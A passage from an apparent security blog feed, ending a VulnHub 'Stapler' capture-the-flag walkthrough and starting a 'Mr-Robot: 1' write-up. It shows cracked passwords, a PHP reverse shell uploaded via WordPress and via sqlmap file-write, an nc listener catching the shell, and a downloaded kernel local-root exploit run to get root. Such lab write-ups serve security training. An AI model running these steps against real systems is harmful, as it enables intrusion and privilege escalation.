<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# john <span class="p">&amp;</span>ndash<span class="p">;</span>show 2.txt
</span><span class='line'>John:incorrect
</span><span class='line'>Elly:ylle
</span><span class='line'>barry:washere
</span><span class='line'>heather:passphrase
</span><span class='line'>garry:football
</span><span class='line'>harry:monkey
</span><span class='line'>scott:cookie
</span><span class='line'>kathy:coolgirl
</span><span class='line'>tim:thumb
</span><span class='line'>ZOE:partyqueen
</span><span class='line'>Dave:damachine
</span><span class='line'>Pam:0520&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;12 password hashes cracked, <span class="m">4</span> left
</span></code></pre></td></tr></table></div></figure></p>

<p>After tried all cracked user/password, I found <code>john</code> has higher priviledge and can be used to upload reverse web shell.</p>

<p>Login to WordPress with john&rsquo;s password, and then upload <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell" title="PHP Reverse Shell by pentestmonkey">pentestmonkey&rsquo;s PHP reverse shell</a>(listen on local port 443) as a plugin.</p>

<p><img class="left" src="/downloads/stapler/4.png"></p>

<p>After installed the plugin, I went to <code>https://10.1.1.138:12380/blogblog/wp-content/uploads/</code> to check if the file has been uploaded.</p>

<p><img class="left" src="/downloads/stapler/5.png"></p>

<p>Greet! The web shell file <code>rsh.php</code> has already been uploaded successfully.</p>

<p>In terms to upload web shell, there is another method by using MySQL to write file.</p>

<p>From the previous stage, I got the full path is <font color="red"><code>/var/www/https/blogblog/</code></font> and also the writable directory is <font color="red"><code>/blogblog/wp-content/uploads/</code></font>. And the target MySQL root login password is <font color="red"><code>plbkac</code></font>.</p>

<p>So, now, I should be able to write web shell to target server via MySQL:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# sqlmap -d mysql://root:plbkac@10.1.1.138:3306/wordpress <span class="p">&amp;</span>ndash<span class="p">;</span>file-write<span class="o">=</span>rsh.php <span class="p">&amp;</span>ndash<span class="p">;</span>file-dest<span class="o">=</span>/var/www/https/blogblog/wp-content/uploads/rsh443.php
</span><span class='line'>         _
</span><span class='line'> &lt;strong&gt;&lt;em&gt; &lt;/em&gt;&lt;/strong&gt;<span class="p">|</span> <span class="p">|</span>&lt;strong&gt;&lt;strong&gt;&lt;em&gt; &lt;/em&gt;&lt;/strong&gt; &lt;/strong&gt;&lt;em&gt;  <span class="o">{</span>1.0.5.0#dev<span class="o">}</span>
</span><span class='line'><span class="p">|</span>&lt;/em&gt; -<span class="p">|</span> . <span class="p">|</span> <span class="p">|</span>     <span class="p">|</span> .<span class="p">&amp;</span>lsquo<span class="p">;|</span> . <span class="p">|</span>
</span><span class='line'><span class="p">|</span>&lt;strong&gt;&lt;em&gt;<span class="p">|</span>&lt;/em&gt;  <span class="p">|</span>&lt;em&gt;<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>&lt;em&gt;<span class="p">|</span>&lt;/em&gt;<span class="p">|</span>&lt;/strong&gt;,<span class="p">|</span>  &lt;em&gt;<span class="p">|</span>
</span><span class='line'>      <span class="p">|</span>&lt;/em&gt;<span class="p">|</span>           <span class="p">|</span>_<span class="p">|</span>   &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://sqlmap.org&quot;</span>&gt;http://sqlmap.org&lt;/a&gt;&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>!<span class="o">]</span> legal disclaimer: Usage of sqlmap <span class="k">for</span> attacking targets without prior mutual consent is illegal. It is the end user<span class="p">&amp;</span>rsquo<span class="p">;</span>s responsibility to obey all applicable <span class="nb">local</span>, state and federal laws. Developers assume no liability and are not responsible <span class="k">for</span> any misuse or damage caused by this program&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>*<span class="o">]</span> starting at 23:12:04&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.138:3306 established
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> testing MySQL
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span><span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> confirming MySQL
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;1&#39;</span><span class="o">]]</span><span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the back-end DBMS is MySQL
</span><span class='line'>back-end DBMS: MySQL &gt;<span class="o">=</span> 5.0.0
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> fingerprinting the back-end DBMS operating system
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> resumed: <span class="o">[[</span>u<span class="s1">&#39;0&#39;</span><span class="o">]]</span><span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the back-end DBMS operating system is Linux
</span><span class='line'><span class="o">[</span>23:12:04<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> <span class="o">(</span>remote<span class="o">)</span> <span class="o">(</span>&lt;em&gt;mysql_exceptions.OperationalError<span class="o">)</span> <span class="o">(</span>1051, <span class="p">&amp;</span>ldquo<span class="p">;</span>Unknown table <span class="p">&amp;</span>lsquo<span class="p">;</span>wordpress.sqlmapfile<span class="p">&amp;</span>rsquo<span class="p">;&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>
</span><span class='line'><span class="o">[</span>23:12:05<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> <span class="o">(</span>remote<span class="o">)</span> <span class="o">(</span>&lt;/em&gt;mysql_exceptions.OperationalError<span class="o">)</span> <span class="o">(</span>1051, <span class="p">&amp;</span>ldquo<span class="p">;</span>Unknown table <span class="p">&amp;</span>lsquo<span class="p">;</span>wordpress.sqlmapfilehex<span class="p">&amp;</span>rsquo<span class="p">;&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>
</span><span class='line'><span class="o">[</span>23:12:05<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> <span class="o">(</span>remote<span class="o">)</span> <span class="o">(</span>&lt;em&gt;mysql_exceptions.OperationalError<span class="o">)</span> <span class="o">(</span>1051, <span class="p">&amp;</span>ldquo<span class="p">;</span>Unknown table <span class="p">&amp;</span>lsquo<span class="p">;</span>wordpress.sqlmapfile<span class="p">&amp;</span>rsquo<span class="p">;&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>
</span><span class='line'><span class="k">do</span> you want confirmation that the <span class="nb">local </span>file <span class="p">&amp;</span>lsquo<span class="p">;</span>rsh.php<span class="p">&amp;</span>rsquo<span class="p">;</span> has been successfully written on the back-end DBMS file system <span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>/var/www/https/blogblog/wp-content/uploads/rsh443.php<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span>? <span class="o">[</span>Y/n<span class="o">]</span> Y
</span><span class='line'><span class="o">[</span>23:12:09<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> the <span class="nb">local </span>file <span class="p">&amp;</span>lsquo<span class="p">;</span>rsh.php<span class="p">&amp;</span>rsquo<span class="p">;</span> and the remote file <span class="p">&amp;</span>lsquo<span class="p">;</span>/var/www/https/blogblog/wp-content/uploads/rsh443.php<span class="p">&amp;</span>rsquo<span class="p">;</span> have the same size <span class="o">(</span><span class="m">5495</span> B<span class="o">)</span>
</span><span class='line'><span class="o">[</span>23:12:09<span class="o">]</span> <span class="o">[</span>WARNING<span class="o">]</span> <span class="o">(</span>remote<span class="o">)</span> <span class="o">(</span>&lt;/em&gt;mysql_exceptions.OperationalError<span class="o">)</span> <span class="o">(</span>1051, <span class="p">&amp;</span>ldquo<span class="p">;</span>Unknown table <span class="p">&amp;</span>lsquo<span class="p">;</span>wordpress.sqlmapfilehex<span class="p">&amp;</span>rsquo<span class="p">;&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>
</span><span class='line'><span class="o">[</span>23:12:09<span class="o">]</span> <span class="o">[</span>INFO<span class="o">]</span> connection to mysql server 10.1.1.138:3306 closed
</span><span class='line'>root@kali:~/myExercises/stapler#
</span></code></pre></td></tr></table></div></figure></p>

<p>Great! looks like the web shell uploaded successfully.</p>

<p>Now got in and time to get ROOT.</p>

<p>Set up <code>nc</code> to listen on local port <code>443</code> and then trigger the shell to connect back by accessing the web shell page on <code>https://10.1.1.138:12380/blogblog/wp-content/uploads/rsh.php</code>.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/myExercises/stapler# nc -lvnp 443
</span><span class='line'>listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> <span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>connect to <span class="o">[</span>10.1.1.132<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.1.1.138<span class="o">]</span> 37668
</span><span class='line'>Linux red.initech 4.4.0-21-generic <span class="c">#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux</span>
</span><span class='line'> 16:08:13 up <span class="m">1</span> day,  1:59,  <span class="m">0</span> users,  load average: 0.00, 0.01, 0.05
</span><span class='line'>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'>/bin/sh: 0: can<span class="p">&amp;</span>rsquo<span class="p">;</span>t access tty<span class="p">;</span> job control turned off
</span><span class='line'><span class="nv">$ </span><span class="nb">pwd</span>
</span><span class='line'>/
</span><span class='line'><span class="nv">$ </span>uname -a
</span><span class='line'>Linux red.initech 4.4.0-21-generic <span class="c">#37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux</span>
</span><span class='line'><span class="err">$</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>After enumeration, I know the target machine is running Linux Kernel 4.4.0, so by using <code>searchsploit</code> to search any existed vulnerability to against the target machine, and lucky I found one Local Root Exploit which is <a href="https://www.exploit-db.com/exploits/39772/" title="Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' in bpf(BPF_PROG_LOAD) Local Root Exploit"><code>Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' in bpf(BPF_PROG_LOAD) Local Root Exploit</code></a></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>wget &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip&quot;</span>&gt;https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip&lt;/a&gt;
</span><span class='line'><span class="p">&amp;</span>ndash<span class="p">;</span>2016-08-13 20:17:02<span class="p">&amp;</span>ndash<span class="p">;</span>  &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip&quot;</span>&gt;https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip&lt;/a&gt;
</span><span class='line'>Resolving github.com <span class="o">(</span>github.com<span class="o">)</span><span class="p">&amp;</span>hellip<span class="p">;</span> 192.30.253.113
</span><span class='line'>Connecting to github.com <span class="o">(</span>github.com<span class="o">)</span><span class="p">|</span>192.30.253.113<span class="p">|</span>:443<span class="p">&amp;</span>hellip<span class="p">;</span> connected.
</span><span class='line'>HTTP request sent, awaiting response<span class="p">&amp;</span>hellip<span class="p">;</span> <span class="m">302</span> Found
</span><span class='line'>Location: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://raw.githubusercontent.com/offensive-security/exploit-database-bin-sploits/master/sploits/39772.zip&quot;</span>&gt;https://raw.githubusercontent.com/offensive-security/exploit-database-bin-sploits/master/sploits/39772.zip&lt;/a&gt; <span class="o">[</span>following<span class="o">]</span>
</span><span class='line'><span class="p">&amp;</span>ndash<span class="p">;</span>2016-08-13 20:17:03<span class="p">&amp;</span>ndash<span class="p">;</span>  &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://raw.githubusercontent.com/offensive-security/exploit-database-bin-sploits/master/sploits/39772.zip&quot;</span>&gt;https://raw.githubusercontent.com/offensive-security/exploit-database-bin-sploits/master/sploits/39772.zip&lt;/a&gt;
</span><span class='line'>Resolving raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span><span class="p">&amp;</span>hellip<span class="p">;</span> 151.101.100.133
</span><span class='line'>Connecting to raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span><span class="p">|</span>151.101.100.133<span class="p">|</span>:443<span class="p">&amp;</span>hellip<span class="p">;</span> connected.
</span><span class='line'>HTTP request sent, awaiting response<span class="p">&amp;</span>hellip<span class="p">;</span> <span class="m">200</span> OK
</span><span class='line'>Length: <span class="m">7115</span> <span class="o">(</span>6.9K<span class="o">)</span> <span class="o">[</span>application/zip<span class="o">]</span>
</span><span class='line'>Saving to: <span class="p">&amp;</span>lsquo<span class="p">;</span>39772.zip<span class="p">&amp;</span>rsquo<span class="p">;</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt; 0K ......                                                100% 14.5M<span class="o">=</span>0s
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;2016-08-13 20:17:03 <span class="o">(</span>14.5 MB/s<span class="o">)</span> - <span class="p">&amp;</span>lsquo<span class="p">;</span>39772.zip<span class="p">&amp;</span>rsquo<span class="p">;</span> saved <span class="o">[</span>7115/7115<span class="o">]</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;<span class="nv">$ </span>unzip 39772.zip
</span><span class='line'>Archive:  39772.zip
</span><span class='line'>   creating: 39772/
</span><span class='line'>  inflating: 39772/.DS_Store       &lt;br/&gt;
</span><span class='line'>   creating: &lt;strong&gt;MACOSX/
</span><span class='line'>   creating: &lt;/strong&gt;MACOSX/39772/
</span><span class='line'>  inflating: &lt;strong&gt;MACOSX/39772/._.DS_Store&lt;br/&gt;
</span><span class='line'>  inflating: 39772/crasher.tar     &lt;br/&gt;
</span><span class='line'>  inflating: &lt;/strong&gt;MACOSX/39772/.&lt;em&gt;crasher.tar&lt;br/&gt;
</span><span class='line'>  inflating: 39772/exploit.tar     &lt;br/&gt;
</span><span class='line'>  inflating: __MACOSX/39772/.&lt;/em&gt;exploit.tar&lt;br/&gt;
</span><span class='line'><span class="err">$</span>
</span><span class='line'><span class="nv">$ </span><span class="nb">cd </span>39772
</span><span class='line'><span class="nv">$ </span>ls
</span><span class='line'>crasher.tar
</span><span class='line'>exploit.tar
</span><span class='line'><span class="nv">$ </span>tar vxf exploit.tar
</span><span class='line'>ebpf_mapfd_doubleput_exploit/
</span><span class='line'>ebpf_mapfd_doubleput_exploit/hello.c
</span><span class='line'>ebpf_mapfd_doubleput_exploit/suidhelper.c
</span><span class='line'>ebpf_mapfd_doubleput_exploit/compile.sh
</span><span class='line'>ebpf_mapfd_doubleput_exploit/doubleput.c
</span><span class='line'><span class="err">$</span>
</span><span class='line'><span class="nv">$ </span>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'><span class="nv">$ </span><span class="nb">cd </span>ebpf_mapfd_doubleput_exploit
</span><span class='line'><span class="nv">$ </span>ls
</span><span class='line'>compile.sh
</span><span class='line'>doubleput.c
</span><span class='line'>hello.c
</span><span class='line'>suidhelper.c
</span><span class='line'><span class="nv">$ </span>./compile.sh
</span><span class='line'>doubleput.c: In <span class="k">function</span> <span class="p">&amp;</span>lsquo<span class="p">;</span>make_setuid<span class="p">&amp;</span>rsquo<span class="p">;</span>:
</span><span class='line'>doubleput.c:91:13: warning: cast from pointer to integer of different size <span class="o">[</span>-Wpointer-to-int-cast<span class="o">]</span>
</span><span class='line'>    .insns <span class="o">=</span> <span class="o">(</span>&lt;strong&gt;aligned_u64<span class="o">)</span> insns,
</span><span class='line'>             ^
</span><span class='line'>doubleput.c:92:15: warning: cast from pointer to integer of different size <span class="o">[</span>-Wpointer-to-int-cast<span class="o">]</span>
</span><span class='line'>    .license <span class="o">=</span> <span class="o">(</span>&lt;/strong&gt;aligned_u64<span class="o">)</span><span class="p">&amp;</span>ldquo<span class="p">;&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'>               ^
</span><span class='line'><span class="nv">$ </span>ls -la
</span><span class='line'>total 60
</span><span class='line'>drwxr-x<span class="p">&amp;</span>mdash<span class="p">;</span> <span class="m">2</span> www-data www-data  <span class="m">4096</span> Aug <span class="m">13</span> 20:18 .
</span><span class='line'>drwxr-xr-x <span class="m">4</span> www-data www-data  <span class="m">4096</span> Aug <span class="m">13</span> 20:17 ..
</span><span class='line'>-rwxr-x<span class="p">&amp;</span>mdash<span class="p">;</span> <span class="m">1</span> www-data www-data   <span class="m">155</span> Apr <span class="m">25</span> 23:25 compile.sh
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> www-data www-data <span class="m">12332</span> Aug <span class="m">13</span> 20:18 doubleput
</span><span class='line'>-rw-r<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> www-data www-data  <span class="m">4188</span> Apr <span class="m">25</span> 23:25 doubleput.c
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> www-data www-data  <span class="m">8024</span> Aug <span class="m">13</span> 20:18 hello
</span><span class='line'>-rw-r<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> www-data www-data  <span class="m">2186</span> Apr <span class="m">25</span> 23:25 hello.c
</span><span class='line'>-rwxrwxrwx <span class="m">1</span> www-data www-data  <span class="m">7520</span> Aug <span class="m">13</span> 20:18 suidhelper
</span><span class='line'>-rw-r<span class="p">&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;</span> <span class="m">1</span> www-data www-data   <span class="m">255</span> Apr <span class="m">25</span> 23:25 suidhelper.c
</span><span class='line'><span class="nv">$ </span>./doubleput
</span><span class='line'>starting writev
</span><span class='line'>woohoo, got pointer reuse
</span><span class='line'>id
</span><span class='line'>writev returned successfully. <span class="k">if</span> this worked, you<span class="p">&amp;</span>rsquo<span class="p">;</span>ll have a root shell in <span class="p">&amp;</span>lt<span class="p">;</span><span class="o">=</span><span class="m">60</span> seconds.
</span><span class='line'>suid file detected, launching rootshell<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>we have root privs now<span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>
</span><span class='line'>python -c <span class="p">&amp;</span>ldquo<span class="p">;</span>import pty<span class="p">;</span> pty.spawn<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>/bin/bash<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span><span class="p">;&amp;</span>rdquo<span class="p">;</span>
</span><span class='line'>root@red:/tmp/39772/ebpf_mapfd_doubleput_exploit#
</span></code></pre></td></tr></table></div></figure></p>

<p>Brilliant! we now got ROOT and caught the flag file under directory <code>/root/</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@red:/root# ls
</span><span class='line'>ls
</span><span class='line'>fix-wordpress.sh  flag.txt  issue  python.sh  wordpress.sql
</span><span class='line'>root@red:/root# cat flag.txt
</span><span class='line'>cat flag.txt
</span><span class='line'>&lt;del&gt;<span class="p">&amp;</span>lt<span class="p">;</span><span class="o">(</span>Congratulations<span class="o">)</span>&gt;&lt;/del&gt;
</span><span class='line'>                          .-<span class="p">&amp;</span>lsquo<span class="p">;&amp;</span>rsquo<span class="p">;&amp;</span>lsquo<span class="p">;&amp;</span>rsquo<span class="p">;&amp;</span>lsquo<span class="p">;</span>-.
</span><span class='line'>                          <span class="p">|&amp;</span>rsquo<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;&amp;</span>lsquo<span class="p">;|</span>
</span><span class='line'>                          <span class="p">|</span>-<span class="p">&amp;</span>hellip<span class="p">;</span>..-<span class="p">|</span>
</span><span class='line'>                          <span class="p">|</span>       <span class="p">|</span>
</span><span class='line'>                          <span class="p">|</span>       <span class="p">|</span>
</span><span class='line'>         &lt;em&gt;,.&lt;/em&gt;             <span class="p">|</span>       <span class="p">|</span>
</span><span class='line'>    __.o&lt;code&gt;  o&lt;/code&gt;<span class="p">&amp;</span>ldquo<span class="p">;</span>-.         <span class="p">|</span>       <span class="p">|</span>
</span><span class='line'> .-O o &lt;code&gt;<span class="s2">&quot;-.o   O )_,._    |       |</span>
</span><span class='line'><span class="s2">( o   O  o )--.-&quot;</span>&lt;/code&gt;O   o<span class="p">&amp;</span>rdquo<span class="p">;</span>-.&lt;code&gt;<span class="s1">&#39;-----&#39;</span>&lt;/code&gt;
</span><span class='line'> <span class="p">&amp;</span>rsquo<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>mdash<span class="p">;&amp;</span>ndash<span class="p">;&amp;</span>lsquo<span class="p">;</span>  <span class="o">(</span>   o  O    o<span class="o">)</span>&lt;br/&gt;
</span><span class='line'>              &lt;code&gt;----------&lt;/code&gt;
</span><span class='line'>b6b545dc11b7a270f4bad23432190c75162c4a2b&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;root@red:/root#
</span></code></pre></td></tr></table></div></figure></p>

<!--- Reference -->



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[VulnHub] Mr-Robot: 1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2016/08/10/vulnhub-mr-robot-1/"/>
    <updated>2016-08-10T20:46:39+10:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2016/08/10/vulnhub-mr-robot-1</id>
    <content type="html"><![CDATA[<p>&ldquo;Based on the show, Mr. Robot. This VM has three keys hidden in different locations. Your goal is to find all three. Each key is progressively difficult to find. The VM isn&rsquo;t too difficult. There isn&rsquo;t any advanced exploitation or reverse engineering. The level is considered beginner-intermediate.&rdquo; &ndash; <a href="https://www.vulnhub.com/author/jason,292/">Jason</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/mr-robot-1,151/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.130/24</em>)</p>

<p>Target: Mr-Robot: 1 (<em>10.1.1.137/24</em>)</p>

<h2>Vulnerability &amp; Exploit</h2>

<ul>
<li><code>robot.txt</code> sensitive information disclosure</li>
<li><code>WordPress</code> username and password bruteforce attack</li>
<li>Exploit Old NMAP <code>--interactive</code> privilege escalation vulnerability to get ROOT</li>
</ul>


<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [<font color="FF8000">arp-scan</font>]</li>
<li>Port scanned the target to discover running services and open ports [<font color="FF8000">masscan</font> &amp;&amp; <font color="FF8000">nmap</font>]</li>
<li>Web application scanned to dig more information about web service [<font color="FF8000">nikto</font>]</li>
<li>Scan specific vulnerability for WordPress CMS [<font color="FF8000">wpscan</font>]</li>
<li>Exploit WordPress administrator/editor account to upload webshell [<font color="FF8000">php-reverse-shell</font>]</li>
<li>Enumeration and exploit the local priviledge vulnerability (<code>old NMAP --interactive</code> vulnerability) to get ROOT</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
